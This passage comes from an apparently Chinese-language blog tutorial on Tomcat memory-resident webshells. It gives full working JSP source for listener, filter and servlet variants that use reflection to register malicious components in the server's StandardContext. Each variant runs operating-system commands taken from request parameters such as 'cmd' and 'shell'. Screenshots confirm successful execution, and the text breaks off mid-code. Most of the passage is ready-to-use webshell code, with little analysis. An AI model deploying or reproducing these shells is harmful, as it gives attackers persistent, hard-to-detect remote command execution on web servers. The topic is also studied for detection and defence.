parameter of <span class="string">&quot;shell&quot;</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;shell&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;shell&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line"><span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="built_in">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">&quot;shell&quot;</span> --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>提交内存马</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7a3f19.png" alt="image-20240912170925048"></p><p>成功</p><p>访问这个木马 并尝试调用计算器</p><p><img src="https://bu.dusays.com/2024/10/11/670931a778ac1.png" alt="image-20240912171453008"></p><p>没有调用出来</p><p>这是因为在把木马写入监听器里</p><p>再次访问</p><p><img src="https://bu.dusays.com/2024/10/11/670931a877d93.png" alt="image-20240912171530172"></p><p>调用成功</p><p>并且此时我们随便找一个路径执行cmd都行</p><p><img src="https://bu.dusays.com/2024/10/11/670931a94cbe6.png" alt="image-20240912171641415"></p><h5 id="过滤器内存马"><a href="#过滤器内存马" class="headerlink" title="过滤器内存马"></a>过滤器内存马</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">    pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.DispatcherType&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.Filter&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.FilterChain&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.FilterConfig&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.FilterRegistration&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletException&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletRequest&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.EnumSet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Insert title here&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;n1ntyfilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">ctx</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">appCtx</span> <span class="operator">=</span> (ApplicationContext)f.get(ctx);</span><br><span class="line"></span><br><span class="line">f = appCtx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)f.get(appCtx);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = standardCtx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map)f.get(standardCtx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">   out.println(<span class="string">&quot;inject &quot;</span>+ name);</span><br><span class="line">   </span><br><span class="line">   <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">         <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest)arg0;</span><br><span class="line">         <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> p.getInputStream().read(data);</span><br><span class="line">            p.destroy();</span><br><span class="line">            arg1.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(data, <span class="number">0</span>, len));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125; </span><br><span class="line">         arg2.doFilter(arg0, arg1);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">   </span><br><span class="line">   <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    </span><br><span class="line">    standardCtx.addFilterDef(filterDef);</span><br><span class="line">   </span><br><span class="line">   <span class="type">FilterMap</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">   m.setFilterName(filterDef.getFilterName());</span><br><span class="line">   m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">   m.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   standardCtx.addFilterMapBefore(m);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">   constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">FilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (FilterConfig)constructor.newInstance(standardCtx, filterDef);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    </span><br><span class="line">    out.println(<span class="string">&quot;injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>创建恶意filter</li><li>用filterDef对filter进行封装</li><li>将filterDef添加到filterDefs跟filterConfigs中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中。要注意的是，因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去</li><li>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启</li></ul><p>访问这个jsp，注入成功后，用?cmd&#x3D;即可命令执行（该方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3）</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7774d7.png" alt="image-20240912172803313"></p><p>同理 访问这个内存马 并执行命令 让他把木马写道过滤器中</p><p><img src="https://bu.dusays.com/2024/10/11/670931a77a33b.png" alt="image-20240912172858373"></p><p>再次访问</p><p><img src="https://bu.dusays.com/2024/10/11/670931aa018d4.png" alt="image-20240912172951522"></p><p>命令执行成功</p><p>同样不管路径 因为访问web一定会经过这三大件</p><p><img src="https://bu.dusays.com/2024/10/11/670931aa4a8d7.png" alt="image-20240912173121134"></p><p>其他内存马</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="line"><span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> revise the <span class="keyword">import</span> <span class="keyword">class</span> <span class="title class_">with</span> correct tomcat version --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request <span class="built_in">this</span> jsp file --&gt;</span><br><span class="line">&lt;!-- <span class="number">3</span> request xxxx/<span class="built_in">this</span> file/../abcd?cmdc=calc --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DefaultFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdc&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmdc&quot;</span>));</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;exec done&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">                </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;DefaultFilter&quot;</span>;</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); </span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="type">DefaultFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilter</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/abcd&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">&quot;Injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="伺服器内存马"><a href="#伺服器内存马" class="headerlink" title="伺服器内存马"></a>伺服器内存马</h5><p>和前面同理</p><ul><li>创建一个恶意的servlet</li><li>获取当前的StandardContext</li><li>将恶意servlet封装成wrapper添加到StandardContext的children当中</li><li>添加ServletMapping将访问的URL和wrapper进行绑定</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 创建恶意Servlet</span></span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取StandardContext</span></span><br><span class="line">    org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用Wrapper对其进行封装</span></span><br><span class="line">    org.apache.catalina.<span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> standardCtx.createWrapper();</span><br><span class="line">    newWrapper.setName(<span class="string">&quot;jweny&quot;</span>);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加封装后的恶意Wrapper到StandardContext的children当中</span></span><br><span class="line">    standardCtx.addChild(newWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加ServletMapping将访问的URL和Servlet进行绑定</span></span><br><span class="line">    standardCtx.addServletMapping(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;jweny&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>访问当前应用的&#x2F;shell路径，加上cmd参数就可以命令执行</p><p><img src="https://bu.dusays.com/2024/10/11/670931a786a7e.png" alt="image-20240912173559801"></p><p>其他伺服器内存马</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span 